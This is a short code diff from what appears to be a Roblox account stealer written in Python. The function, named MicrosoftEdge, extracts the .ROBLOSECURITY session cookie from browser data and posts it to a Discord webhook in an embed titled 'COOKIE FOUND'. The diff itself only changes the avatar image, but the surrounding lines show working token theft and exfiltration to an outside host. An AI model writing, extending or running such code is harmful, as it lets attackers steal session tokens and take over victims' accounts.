@@ -11,7 +11,7 @@ def MicrosoftEdge():
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
         requests.post(WebHook, json = {
             "username" : "RED SKULL|COOK'ER",
-            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1071562320553197578/virus_1.png", 
+            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
             "embeds": [{
             "title": "COOKIE FOUND", 
             "description": f"```{cookie}```", 
